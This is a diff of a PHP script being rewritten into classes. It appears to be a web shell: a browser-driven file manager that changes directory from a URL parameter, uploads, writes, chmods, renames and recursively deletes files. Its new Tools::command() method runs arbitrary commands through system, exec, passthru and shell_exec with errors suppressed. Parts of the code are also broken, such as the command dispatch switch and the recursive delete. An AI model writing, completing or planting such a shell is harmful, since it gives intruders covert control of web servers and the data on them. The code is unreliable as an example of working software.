@@ -1,251 +1,233 @@
-<?php 
-
-$modes = [
-	"readonly" 	=> "r",
-	"writeonly" => "w",
-	"append"	=> "a"
-];
-
-function cwd() 
+<?php
+/**
+ * 
+ */
+class listFiles
 {
-	if (isset($_GET['x'])) {
-		$cwd = str_replace("\\", "/", $_GET['x']);
-		@cd($cwd);
-	} else {
-		$cwd = str_replace("\\", "/", getcwd());
-	} return $cwd;
-}
-
-function scDir()
-{
-	return scandir(cwd());
-}
-
-function htmlSafe($str)
-{
-	return htmlspecialchars($str);
-}
-
-function color($bold = 1, $colorid = null, $string = null) {
-	$color = [
-		"</font>",  			# 0 off
-		"<font color='red'>",	# 1 red 
-		"<font color='green'>",	# 2 lime
-		"<font color='white'>",	# 3 white
-		"<font color='gold'>",	# 4 gold
-	];
-
-	return ($string !== null) ? $color[$colorid].$string.$color[0]: $color[$colorid];
-}
-
-function cd($directory)
-{
-	return @chdir($directory);
-}
-
-function wr($filename, $perms)
-{
-	return (!is_writable($filename)) ? color(1, 1, $perms) : color(1, 2, $perms);
-}
-
-function getfTime($filename)
-{
-	return date("d/m/Y - H:i:s", filemtime($filename));
-}
-
-function perms($filename)
-{
-	$perms = fileperms($filename);
-
-	switch ($perms & 0xF000) {
-    	case 0xC000: // socket
-        	$info = 's';
-        	break;
-    	case 0xA000: // symbolic link
-        	$info = 'l';
-        	break;
-    	case 0x8000: // regular
-        	$info = 'r';
-        	break;
-    	case 0x6000: // block special
-        	$info = 'b';
-        	break;
-    	case 0x4000: // directory
-        	$info = 'd';
-        	break;
-    	case 0x2000: // character special
-        	$info = 'c';
-        	break;
-    	case 0x1000: // FIFO pipe
-        	$info = 'p';
-        	break;
-    	default: // unknown
-        	$info = 'u';
+	protected $path;
+	protected $result;
+	
+	function __construct()
+	{
+		$this->path = str_replace("\\", "/", getcwd());
 	}
 
-	$info .= (($perms & 0x0100) ? 'r' : '-');
-	$info .= (($perms & 0x0080) ? 'w' : '-');
-	$info .= (($perms & 0x0040) ?
-		(($perms & 0x0800) ? 's' : 'x' ) :
-		(($perms & 0x0800) ? 'S' : '-'));
+	public function path()
+	{
+		return $this->path;
+	}
 
-	$info .= (($perms & 0x0020) ? 'r' : '-');
-	$info .= (($perms & 0x0010) ? 'w' : '-');
-	$info .= (($perms & 0x0008) ?
-		(($perms & 0x0400) ? 's' : 'x' ) :
-		(($perms & 0x0400) ? 'S' : '-'));
+	public function list($type)
+	{
+		$this->result= [];
+		foreach (scandir($this->path()) as $key => $value) {
+			$filename = [
+				"getPathname"	=> $this->path() . DIRECTORY_SEPARATOR . $value,
+				"getName"		=> $value
+			];
 
-	$info .= (($perms & 0x0004) ? 'r' : '-');
-	$info .= (($perms & 0x0002) ? 'w' : '-');
-	$info .= (($perms & 0x0001) ?
-		(($perms & 0x0200) ? 't' : 'x' ) :
-		(($perms & 0x0200) ? 'T' : '-'));
+			switch ($type) {
+				case "dir":
+					if (!is_dir($filename["getPathname"]) || $value === "." || $value === "..") {
+						continue 2;
+					}
+					break;
+				
+				case "file":
+					if (!is_file($filename["getPathname"])) {
+						continue 2;
+					}
+					break;
+			}
 
-return $info;
+			$this->result[] = $filename;
+		} return $this->result;
+	}
+
+	public function dirs()
+	{
+		return $this->list("dir");
+	}
+
+	public function files()
+	{
+		return $this->list("file");
+	}
+
+	public function listAll($dir)
+	{
+		foreach (scandir($dir) as $key => $value) {
+			$path = $dir . DIRECTORY_SEPARATOR . $value;
+			if (!is_dir($path)) {
+				$this->result[] = $value;
+			} elseif ($value != '.' && $value != "..") {
+				$this->listAll($path);
+				$this->result[] = $value;
+			}
+		} return $this->result;
+	}
 }
 
-function listAllFiles($dir, &$result = array())
+/**
+ * 
+ */
+
+class Tools
 {
-	foreach (scandir($dir) as $key => $value) {
-		$pathname = $dir . DIRECTORY_SEPARATOR . $value;
-		if (!is_dir($pathname)) {
-			$result[] = $pathname;
-		} elseif ($value != "." && $value != "..") {
-			listAllFiles($pathname, $result);
-			$result[] = $pathname;
+	protected $path, $name, $resource, $data = null, $cwd = null;
+	
+	function __construct()
+	{
+		$this->path = str_replace("\\", "/", getcwd());
+	}
+
+	public function make($filename)
+	{
+		$this->resource = $filename;
+		return $this;
+	}
+
+	public function path($path)
+	{
+		$this->cwd = $path;
+		return $this;
+	}
+
+	public function dir()
+	{
+		return (!empty($this->resource)) ? mkdir($this->cwd . DIRECTORY_SEPARATOR . $this->resource) : false;
+	}
+
+	public function file($data)
+	{
+		foreach ($this->resource as $key => $value) {
+			$explode = explode(",", $this->resource[$key]);
+			foreach ($explode as $value) {
+				var_dump($value);
+				// $action = new action($this->cwd . DIRECTORY_SEPARATOR . $value);
+				// return (!empty($data)) ? $action->open("write")->write($data) : false;
+			}
 		}
-	} return $result;
-}
-
-function formatSize($bytes)
-{
-	$format = [
-		"kb" => 1024,
-		"mb" => 1048576,
-		"gb" => 1073741824,
-		"tb" => 1099511627776
-	];
-
-	switch ($bytes) {
-		case ($bytes >= 0) && ($bytes < $format["kb"]):
-			return $bytes . " B";
-			break;
-		case ($bytes >= $format["kb"]) && ($bytes < $format["mb"]):
-			return ceil($bytes / $format["kb"]) . " KB";
-			break;
-		case ($bytes >= $format["mb"]) && ($bytes < $format["gb"]):
-			return ceil($bytes / $format["mb"]) . " MB";
-			break;
-		case ($bytes >= $format["gb"]) && ($bytes < $format["tb"]):
-			return ceil($bytes / $format["gb"]) . " GB";
-			break;
-		case ($bytes >= $format["tb"]):
-			return ceil($bytes / $format["tb"]) . " TB";
-			break;
-		default:
-			return $bytes . " B";
-			break;
 	}
-}
 
-function getSize($filename)
-{
-	return formatSize(filesize($filename));
-}
+	public function command($command)
+	{
+		$command = $command;
 
-function listFiles($type, $result = [])
-{
-	foreach (scDir() as $key => $value) {
-		$listFiles = [
-			"getPathname" 	=> cwd() . DIRECTORY_SEPARATOR . $value,
-			"getName"		=> $value,
-			"getSize"		=> getSize($value),
-			"getPerm"		=> wr($value, perms($value)),
-			"getTime"		=> getfTime($value)
-		];
-
-		switch ($type) {
-			case 'dir':
-				if (!is_dir($listFiles["getPathname"]) || $value === "." || $value === "..") continue 2;
+		switch ($command) {
+			case function_exists("system"):
+				@ob_start();
+				@system($command);
+				$buff = @ob_get_contents(); 
+				@ob_end_clean();
+				return $buff; 	
 				break;
 			
-			case 'file':
-				if (!is_file($listFiles["getPathname"])) continue 2;
+			case function_exists("exec"):
+				@exec($command, $result);
+				$buff = "";
+				foreach ($result as $key => $value) {
+					$buff .= $value;
+				} return $buff;
+				break;
+
+			case function_exists("passthru"):
+				@ob_start();
+				@passthru($command);
+				$buff = @ob_get_contents();
+				@ob_end_clean();
+				return $buff;
+				break;
+
+			case function_exists("shell_exec"):
+				$buff = @shell_exec($command);
+				return $buff;
 				break;
 		}
-
-		$result[] = $listFiles;
-	} return $result; 
-}
-
-function getFileMode($filename)
-{
-	return substr(sprintf("%o", fileperms(htmlSafe($filename))), -4);
-}
-
-function changeMode($filename, $mode)
-{
-	return (!empty($filename)) ? chmod(htmlSafe($filename), $mode) : false;
-}
-
-function changeName($oldname, $newname)
-{
-	return (!empty($oldname)) ? rename($oldname, cwd() . DIRECTORY_SEPARATOR . $newname) : false;
-}
-
-function write($filename, $data, $mode)
-{
-	global $modes;
-
-	if (!empty(trim($filename))) {
-		$handle = fopen(htmlSafe($filename), $modes[$mode]);
-		return (!empty($data)) ? fwrite($handle, $data) : false;
 	}
 }
 
-function make($filename, $data = null, $type = null)
+class action
 {
-	$filename = htmlSafe($filename);
-	switch ($type) {
-		case 'makedir':
-			return mkdir($filename, 0777);
-		break;
-
-		case 'makefile':
-			return write($filename, $data, "append");
-		break;
+	protected $path, $filename;
+	protected $handle;
+	protected $modes = [
+			"read"		=> "r",
+			"write" 	=> "w",
+			"append"	=> "a"
+	];
+	
+	function __construct($filename)
+	{
+		$this->path = str_replace("\\", "/", getcwd());
+		$this->filename = $filename;
 	}
-}
 
-function multipleUpload(&$files)
-{
-	$names = array( 'name' => 1, 'type' => 1, 'tmp_name' => 1, 'error' => 1, 'size' => 1);
-
-    foreach ($files as $key => $part) {
-        $key = (string) $key;
-        if (isset($names[$key]) && is_array($part)) {
-            foreach ($part as $position => $value) {
-                $files[$position][$key] = $value;
-            } unset($files[$key]);
-        }
-    }
-}
-// Upload
-/*if (isset($_POST['submit'])) {
-	multipleUpload($_FILES['files']);
-	foreach ($_FILES['files'] as $key => $file) {
-		var_dump($file);
-		copy($file["tmp_name"], $_POST['dir'] . DIRECTORY_SEPARATOR . $file["name"])
-	}
-}
-*/
-
-// Make
-/*if (isset($_POST['submit'])) {
-	foreach ($_POST['file'] as $key => $value) {
-		$xplode = explode(",", $_POST['file'][$key]);
-		foreach ($xplode as $file) {
-			var_dump(make($file, "santuy", "makefile"));
+	public function open($mode)
+	{
+		if (!empty(trim($this->filename))) {
+			$this->handle = fopen($this->filename, $this->modes[$mode]);
+			return $this;
 		}
+	}
+
+	public function read()
+	{
+		return htmlspecialchars(file_get_contents($this->filename));
+	}
+
+	public function write($data)
+	{
+		return (!empty($data)) ? fwrite($this->handle, $data) : false;
+	}
+
+	public function chname($newname)
+	{
+		return (!empty($this->filename)) ? rename($this->filename, $this->path . DIRECTORY_SEPARATOR . $newname) : false;
+	}
+
+	public function chmode($mode)
+	{
+		return (!empty($this->filename)) ? chmod($this->filename, $mode) : false;
+	}
+
+	public function delete()
+	{
+		if (is_dir($this->filename)) {
+			foreach (scandir($this->filename) as $key => $value) {
+				if ($value != "." && $value != "..") {
+					if (is_dir($this->filename)) {
+						$this->delete($this->filename . DIRECTORY_SEPARATOR . $value);
+					} else {
+						unlink($this->filename . DIRECTORY_SEPARATOR . $value);
+					}
+				}
+			}
+			if (@rmdir($this->filename)) {
+				return true;
+			} else {
+				return false;
+			}
+		} else {
+			if (@unlink($this->filename)) {
+				return true;
+			} else {
+				return false;
+			}
+		}
+	}
+}
+
+/*$list = new listFiles;
+
+$Tools = new Tools;
+
+
+if (isset($_POST['submit'])) {
+	$Tools = new Tools;
+	if ($Tools->make($_POST['file'])->path("image")->file("testimoni")) {
+		print("success");
+	} else {
+		print("failed");
 	}
 }*/
